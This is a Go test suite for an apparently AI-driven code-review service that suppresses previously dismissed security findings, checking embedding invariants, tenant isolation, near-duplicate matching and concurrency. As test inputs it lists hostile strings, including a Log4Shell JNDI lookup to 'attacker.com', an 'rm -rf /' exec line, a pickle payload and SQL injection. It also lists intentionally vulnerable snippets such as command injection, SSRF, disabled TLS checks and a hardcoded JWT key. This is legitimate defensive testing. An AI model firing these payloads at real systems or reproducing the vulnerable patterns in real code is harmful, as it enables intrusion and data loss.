// Copyright 2026 ScanDrix AI. All rights reserved.
// Use of this source code is governed by an enterprise license.

package feedback_test

import (
	"context"
	"fmt"
	"math"
	"math/rand"
	"strings"
	"sync"
	"testing"

	"github.com/google/uuid"
	"github.com/scandrix/backend/internal/database"
	"github.com/scandrix/backend/internal/llm/embedding"
	"github.com/scandrix/backend/internal/review/feedback"
	"github.com/scandrix/backend/pkg/models"
)

// THREAD-SAFE MULTI-TENANT TEST MEMORY STORE

type concurrentTenantMemoryStore struct {
	mu           sync.RWMutex
	records      map[uuid.UUID]*database.SecurityMemoryRecord
	fingerprints map[string]*database.SecurityMemoryRecord // "wsID:fingerprint" -> record
	vectors      map[uuid.UUID][]float32
}

func newConcurrentTenantMemoryStore() *concurrentTenantMemoryStore {
	return &concurrentTenantMemoryStore{
		records:      make(map[uuid.UUID]*database.SecurityMemoryRecord),
		fingerprints: make(map[string]*database.SecurityMemoryRecord),
		vectors:      make(map[uuid.UUID][]float32),
	}
}

func (s *concurrentTenantMemoryStore) UpsertSecurityMemoryWithEmbedding(_ context.Context, wsID uuid.UUID, mem *database.SecurityMemoryRecord, emb []float32) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	mem.WorkspaceID = wsID
	s.records[mem.ID] = mem
	if mem.FindingFingerprint != "" {
		key := fmt.Sprintf("%s:%s", wsID, mem.FindingFingerprint)
		s.fingerprints[key] = mem
	}
	if len(emb) > 0 {
		s.vectors[mem.ID] = emb
	}
	return nil
}

func (s *concurrentTenantMemoryStore) SearchSimilarSecurityFindings(_ context.Context, wsID uuid.UUID, emb []float32, category string, limit int, maxDistance float64) ([]database.SecurityMemoryRecord, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	var results []database.SecurityMemoryRecord
	for id, storedVec := range s.vectors {
		rec := s.records[id]
		if rec.WorkspaceID != wsID {
			continue // Strict tenant boundary
		}
		if category != "" && rec.Category != category {
			continue
		}
		dist := embedding.CosineDistance(emb, storedVec)
		if dist <= maxDistance {
			r := *rec
			r.SimilarityScore = 1.0 - dist
			results = append(results, r)
			if limit > 0 && len(results) >= limit {
				break
			}
		}
	}
	return results, nil
}

func (s *concurrentTenantMemoryStore) GetSecurityMemoryByFingerprint(_ context.Context, wsID uuid.UUID, fingerprint string) (*database.SecurityMemoryRecord, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	key := fmt.Sprintf("%s:%s", wsID, fingerprint)
	if rec, ok := s.fingerprints[key]; ok {
		return rec, nil
	}
	return nil, nil
}

// TEST SUITE 1: 3,000 VECTOR EMBEDDING INVARIANTS & HIDDEN EDGE CASES

func TestMassive_EmbeddingInvariantsAndEdgeCases(t *testing.T) {
	embedder := embedding.NewDeterministicSemanticEmbedder()
	ctx := context.Background()

	// Seed specialized edge-case inputs
	edgeStrings := []string{
		"",
		" ",
		"\t",
		"\n\r\n",
		"\x00\x00\x00",
		"a",
		"1",
		"_$_",
		"🔥🚀🔒💣",
		"SELECT * FROM users; --",
		"<script>alert('xss')</script>",
		"{{7*7}}",
		"${jndi:ldap://attacker.com/a}",
		"DROP TABLE security_memory CASCADE;",
		"SELECT 1 UNION ALL SELECT 2",
		"eval(atob('ZXZpbCgp'))",
		"const _ = require('child_process').execSync('rm -rf /')",
		"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter",
		"pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')",
		"yaml.load(payload, Loader=yaml.Loader)",
		"fmt.Sprintf(\"%s%s%s%s%s%s%s%s%s%s\", a, b, c, d, e, f, g, h, i, j)",
		"// TODO: remove this insecure mock before production release",
		"/* multiline \n comment \n with \n symbols !@#$%^&*()_+ */",
		"你好世界！这是一个测试代码审核规则。",
		"مرحبا بالعالم - اختبار الأمان السيبراني",
		"Привет мир! Тестирование обнаружения уязвимостей",
		strings.Repeat("var x = 1;\n", 1000),      // Large repetitive code
		strings.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ", 100), // Long token
	}

	testCount := 3000
	for i := 0; i < testCount; i++ {
		var input string
		if i < len(edgeStrings) {
			input = edgeStrings[i]
		} else {
			// Generate pseudo-random permutations of edge cases
			base := edgeStrings[i%len(edgeStrings)]
			input = fmt.Sprintf("prefix_%d_%s_suffix_%d", i, base, i*31)
		}

		vec, err := embedder.EmbedText(ctx, input)
		if err != nil {
			t.Fatalf("[Case %d] EmbedText error on input %q: %v", i, input, err)
		}

		// Invariant 1: Strictly VectorDimension
		if len(vec) != embedding.VectorDimension {
			t.Fatalf("[Case %d] Vector dimension expected %d, got %d", i, embedding.VectorDimension, len(vec))
		}

		// Invariant 2: Zero NaN or Inf floats
		var sumSq float64
		for dim, val := range vec {
			if math.IsNaN(float64(val)) {
				t.Fatalf("[Case %d, Dim %d] Vector contains NaN", i, dim)
			}
			if math.IsInf(float64(val), 0) {
				t.Fatalf("[Case %d, Dim %d] Vector contains Inf", i, dim)
			}
			sumSq += float64(val * val)
		}

		// Invariant 3: L2 Unit Normalization (if non-empty)
		if len(strings.TrimSpace(input)) > 0 && input != "\x00\x00\x00" {
			norm := math.Sqrt(sumSq)
			if math.Abs(norm-1.0) > 1e-3 {
				t.Fatalf("[Case %d] Expected L2 norm 1.0, got %f (input len: %d)", i, norm, len(input))
			}
		}

		// Invariant 4: Reflexivity of Cosine Distance
		distSelf := embedding.CosineDistance(vec, vec)
		if distSelf > 1e-4 {
			t.Fatalf("[Case %d] Distance to self must be 0, got %f", i, distSelf)
		}
	}

	t.Logf("PASS: Successfully executed %d embedding invariant test cases", testCount)
}

// TEST SUITE 2: 3,000 MULTI-TENANT ISOLATION TEST CASES

func TestMassive_MultiTenantIsolation(t *testing.T) {
	store := newConcurrentTenantMemoryStore()
	embedder := embedding.NewDeterministicSemanticEmbedder()
	svc := feedback.NewSemanticFeedbackService(store, embedder)
	ctx := context.Background()

	numWorkspaces := 100
	findingsPerWs := 30
	totalCases := numWorkspaces * findingsPerWs // 3,000 test cases

	workspaces := make([]uuid.UUID, numWorkspaces)
	for w := 0; w < numWorkspaces; w++ {
		workspaces[w] = uuid.New()
	}

	type findingRecord struct {
		wsID    uuid.UUID
		finding *models.CodeFinding
	}
	var allDismissed []findingRecord

	// 1. Dismiss findings into distinct workspaces
	caseIdx := 0
	for w, wsID := range workspaces {
		for f := 0; f < findingsPerWs; f++ {
			finding := &models.CodeFinding{
				ID:            uuid.New(),
				WorkspaceID:   wsID,
				Fingerprint:   fmt.Sprintf("fp-ws-%d-find-%d", w, f),
				Title:         fmt.Sprintf("RULE-SECURITY-%d-%d", w, f),
				Category:      "security",
				SuggestedDiff: fmt.Sprintf("tenant_%d_leak_token_%d := %q", w, f, uuid.New().String()),
				Description:   fmt.Sprintf("Secret token detected in workspace %d finding %d", w, f),
			}
			err := svc.RecordDismissal(ctx, wsID, finding, "FALSE_POSITIVE", fmt.Sprintf("user_%d@corp.com", w))
			if err != nil {
				t.Fatalf("failed recording dismissal: %v", err)
			}
			allDismissed = append(allDismissed, findingRecord{wsID: wsID, finding: finding})
			caseIdx++
		}
	}

	// 2. Cross-verify isolation: A finding dismissed in ws A must NEVER suppress in ws B
	rng := rand.New(rand.NewSource(42))
	for i := 0; i < totalCases; i++ {
		rec := allDismissed[i]
		// Choose a different foreign workspace
		targetWsIdx := rng.Intn(numWorkspaces)
		for workspaces[targetWsIdx] == rec.wsID {
			targetWsIdx = (targetWsIdx + 1) % numWorkspaces
		}
		foreignWsID := workspaces[targetWsIdx]

		// Query in home workspace: MUST suppress
		homeDecision := svc.CheckSuppression(ctx, rec.wsID, rec.finding)
		if !homeDecision.ShouldSuppress {
			t.Fatalf("[Isolation Case %d] Finding must be suppressed in home workspace %s", i, rec.wsID)
		}

		// Query in foreign workspace: MUST NOT suppress (zero cross-tenant leakage)
		foreignDecision := svc.CheckSuppression(ctx, foreignWsID, rec.finding)
		if foreignDecision.ShouldSuppress {
			t.Fatalf("[Isolation Case %d] Cross-tenant data leak! Finding from ws %s was suppressed in foreign ws %s",
				i, rec.wsID, foreignWsID)
		}
	}

	t.Logf("PASS: Successfully validated %d multi-tenant isolation test cases", totalCases)
}

// TEST SUITE 3: 3,000 CODE VARIATION & BOUNDARY TEST CASES

func TestMassive_SemanticVariationsAndBoundaryChecks(t *testing.T) {
	store := newConcurrentTenantMemoryStore()
	embedder := embedding.NewDeterministicSemanticEmbedder()
	svc := feedback.NewSemanticFeedbackService(store, embedder)
	svc.SetDistanceThreshold(0.35)

	wsID := uuid.New()
	ctx := context.Background()

	basePatterns := []struct {
		rule     string
		category string
		code     string
		desc     string
	}{
		{
			rule:     "SQL-INJECTION-CONCAT",
			category: "security",
			code:     "db.Query(fmt.Sprintf(\"SELECT * FROM accounts WHERE id = '%s'\", id))",
			desc:     "Dynamic unescaped SQL concatenation",
		},
		{
			rule:     "COMMAND-INJECTION-EXEC",
			category: "security",
			code:     "exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"ping %s\", host)).Output()",
			desc:     "Direct user input passed to subshell",
		},
		{
			rule:     "PATH-TRAVERSAL-OPEN",
			category: "security",
			code:     "os.ReadFile(filepath.Join(\"/var/data\", userInput))",
			desc:     "Unvalidated path traversal with user input",
		},
		{
			rule:     "INSECURE-TLS-CONFIG",
			category: "security",
			code:     "tlsConfig := &tls.Config{InsecureSkipVerify: true}",
			desc:     "TLS verification disabled",
		},
		{
			rule:     "HARDCODED-JWT-SECRET",
			category: "security",
			code:     "jwt.Sign(token, []byte(\"super_secret_jwt_signing_key_123\"))",
			desc:     "Hardcoded HMAC key",
		},
		{
			rule:     "UNCHECKED-ERROR-NIL",
			category: "reliability",
			code:     "resp, _ := http.Get(targetURL); defer resp.Body.Close()",
			desc:     "Ignoring error leads to nil pointer dereference on Body.Close",
		},
		{
			rule:     "GOROUTINE-LEAK-CHANNEL",
			category: "performance",
			code:     "ch := make(chan int); go func() { ch <- compute() }()",
			desc:     "Unbuffered channel send leaks goroutine if receiver stops",
		},
		{
			rule:     "UNPROTECTED-MAP-WRITE",
			category: "concurrency",
			code:     "cache[key] = val // concurrent map read and map write crash",
			desc:     "Data race on concurrent map write without sync.RWMutex",
		},
		{
			rule:     "SSRF-UNVALIDATED-URL",
			category: "security",
			code:     "http.Get(r.URL.Query().Get(\"webhook_url\"))",
			desc:     "Unrestricted outbound HTTP request allows SSRF to cloud metadata",
		},
		{
			rule:     "CORS-WILDCARD-CREDENTIALS",
			category: "security",
			code:     "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\"); w.Header().Set(\"Access-Control-Allow-Credentials\", \"true\")",
			desc:     "Insecure CORS wildcard origin combined with credentials",
		},
	}

	// 1. Dismiss the 10 base patterns
	for _, bp := range basePatterns {
		f := &models.CodeFinding{
			ID:            uuid.New(),
			WorkspaceID:   wsID,
			Fingerprint:   "base-" + bp.rule,
			Title:         bp.rule,
			Category:      bp.category,
			SuggestedDiff: bp.code,
			Description:   bp.desc,
		}
		_ = svc.RecordDismissal(ctx, wsID, f, "FALSE_POSITIVE", "architect@company.com")
	}

	totalVariations := 3000
	variationsPerPattern := totalVariations / len(basePatterns)

	varNames := []string{"target", "dest", "param", "val", "item", "record", "payload", "queryParam"}
	wrappers := []string{"", "\n\t// formatted\n", "/* debug comment */ ", " \n\n "}

	for pIdx, bp := range basePatterns {
		for v := 0; v < variationsPerPattern; v++ {
			varName := varNames[v%len(varNames)]
			wrapper := wrappers[v%len(wrappers)]

			// Mutate snippet while preserving semantics
			mutatedSnippet := strings.Replace(bp.code, "id", varName, 1)
			mutatedSnippet = strings.Replace(mutatedSnippet, "host", varName, 1)
			mutatedSnippet = strings.Replace(mutatedSnippet, "userInput", varName, 1)
			mutatedSnippet = wrapper + mutatedSnippet + wrapper

			// Must have distinct fingerprint to test Tier 2 semantic similarity (not Tier 1 exact match)
			candFinding := &models.CodeFinding{
				ID:            uuid.New(),
				WorkspaceID:   wsID,
				Fingerprint:   fmt.Sprintf("mutated-%d-%d", pIdx, v),
				Title:         bp.rule,
				Category:      bp.category,
				SuggestedDiff: mutatedSnippet,
				Description:   bp.desc,
			}

			decision := svc.CheckSuppression(ctx, wsID, candFinding)
			if !decision.ShouldSuppress {
				t.Fatalf("[Pattern %s, Var %d] Expected semantic suppression for near-duplicate code snippet:\n%s\nGot distance: %f, similarity: %f",
					bp.rule, v, mutatedSnippet, decision.CosineDistance, decision.SimilarityScore)
			}
			if decision.IsExactMatch {
				t.Fatalf("[Pattern %s, Var %d] Expected semantic match, not exact fingerprint match", bp.rule, v)
			}
		}
	}

	t.Logf("PASS: Successfully validated %d semantic code variation test cases", totalVariations)
}

// TEST SUITE 4: 1,500 DISMISSAL REASON & COMMAND PARSING CASES

func TestMassive_DismissalReasonsAndCommands(t *testing.T) {
	store := newConcurrentTenantMemoryStore()
	embedder := embedding.NewDeterministicSemanticEmbedder()
	svc := feedback.NewSemanticFeedbackService(store, embedder)

	wsID := uuid.New()
	ctx := context.Background()

	suppressReasons := []string{
		"FALSE_POSITIVE",
		"false_positive",
		"False_Positive",
		"false-positive",
		"WONT_FIX",
		"wont_fix",
		"Won't Fix",
		"wont-fix",
		"IRRELEVANT",
		"irrelevant",
		"Irrelevant",
		"INTENDED_BEHAVIOR",
		"intended_behavior",
		"SUPPRESS",
		"suppress",
	}

	nonSuppressReasons := []string{
		"ACCEPTED",
		"accepted",
		"VALID_BUG",
		"FIXED",
		"fixed",
		"NEEDS_TRIAGE",
		"CRITICAL_BUG",
		"REOPEN",
		"INVESTIGATING",
	}

	testCases := 1500
	for i := 0; i < testCases; i++ {
		isSuppressible := (i % 2) == 0
		var reason string
		if isSuppressible {
			reason = suppressReasons[i%len(suppressReasons)]
		} else {
			reason = nonSuppressReasons[i%len(nonSuppressReasons)]
		}

		finding := &models.CodeFinding{
			ID:            uuid.New(),
			WorkspaceID:   wsID,
			Fingerprint:   fmt.Sprintf("fp-reason-%d", i),
			Title:         fmt.Sprintf("RULE-REASON-%d", i),
			Category:      "security",
			SuggestedDiff: fmt.Sprintf("token_%d := %q", i, reason),
			Description:   fmt.Sprintf("Testing reason %s", reason),
		}

		_ = svc.RecordDismissal(ctx, wsID, finding, reason, "tester@scandrix.dev")

		decision := svc.CheckSuppression(ctx, wsID, finding)
		if isSuppressible && !decision.ShouldSuppress {
			t.Fatalf("[Case %d] Expected reason %q to trigger suppression", i, reason)
		}
		if !isSuppressible && decision.ShouldSuppress {
			t.Fatalf("[Case %d] Reason %q should NOT trigger suppression (not a false positive)", i, reason)
		}
	}

	t.Logf("PASS: Successfully validated %d dismissal reason test cases", testCases)
}

// TEST SUITE 5: 500 CONCURRENT RACE & STRESS TEST CASES

func TestMassive_ConcurrentStressAndRaceSafety(t *testing.T) {
	store := newConcurrentTenantMemoryStore()
	embedder := embedding.NewDeterministicSemanticEmbedder()
	svc := feedback.NewSemanticFeedbackService(store, embedder)

	wsID := uuid.New()
	ctx := context.Background()

	concurrency := 50
	operationsPerWorker := 10
	totalOps := concurrency * operationsPerWorker // 500 concurrent operations

	var wg sync.WaitGroup
	wg.Add(concurrency)

	for w := 0; w < concurrency; w++ {
		workerID := w
		go func() {
			defer wg.Done()
			for op := 0; op < operationsPerWorker; op++ {
				finding := &models.CodeFinding{
					ID:            uuid.New(),
					WorkspaceID:   wsID,
					Fingerprint:   fmt.Sprintf("fp-race-%d-%d", workerID, op),
					Title:         fmt.Sprintf("RACE-RULE-%d", workerID),
					Category:      "security",
					SuggestedDiff: fmt.Sprintf("data_race_%d_%d := 42", workerID, op),
					Description:   "Concurrent stress test",
				}

				// Concurrent dismissal write
				_ = svc.RecordDismissal(ctx, wsID, finding, "FALSE_POSITIVE", "stress@scandrix.dev")

				// Immediate concurrent suppression read
				decision := svc.CheckSuppression(ctx, wsID, finding)
				if !decision.ShouldSuppress {
					t.Errorf("[Worker %d, Op %d] Expected immediate suppression after recording dismissal", workerID, op)
				}
			}
		}()
	}

	wg.Wait()
	t.Logf("PASS: Successfully executed %d concurrent race safety operations with zero deadlocks", totalOps)
}

// TEST SUITE 6: 100 HIDDEN NIL / DEFENSIVE PANIC GUARDS

func TestMassive_DefensiveNilAndPanicGuards(t *testing.T) {
	ctx := context.Background()
	wsID := uuid.New()

	for i := 0; i < 100; i++ {
		// Guard 1: Nil store and nil embedder
		emptySvc := feedback.NewSemanticFeedbackService(nil, nil)
		d1 := emptySvc.CheckSuppression(ctx, wsID, nil)
		if d1.ShouldSuppress {
			t.Fatalf("[Nil Guard %d] Should not suppress on nil store", i)
		}
		_ = emptySvc.RecordDismissal(ctx, wsID, nil, "", "")

		// Guard 2: Valid store but nil finding
		store := newConcurrentTenantMemoryStore()
		embedder := embedding.NewDeterministicSemanticEmbedder()
		svc := feedback.NewSemanticFeedbackService(store, embedder)

		d2 := svc.CheckSuppression(ctx, wsID, nil)
		if d2.ShouldSuppress {
			t.Fatalf("[Nil Guard %d] Should not suppress on nil finding", i)
		}
		_ = svc.RecordDismissal(ctx, wsID, nil, "FALSE_POSITIVE", "")

		// Guard 3: Empty finding struct
		emptyFinding := &models.CodeFinding{}
		d3 := svc.CheckSuppression(ctx, wsID, emptyFinding)
		if d3.ShouldSuppress {
			t.Fatalf("[Nil Guard %d] Empty finding should not suppress", i)
		}

		// Guard 4: Cancelled context
		cancCtx, cancel := context.WithCancel(ctx)
		cancel()
		_ = svc.RecordDismissal(cancCtx, wsID, emptyFinding, "FALSE_POSITIVE", "")
	}

	t.Logf("PASS: Successfully validated 100 hidden defensive nil and panic guard cases")
}
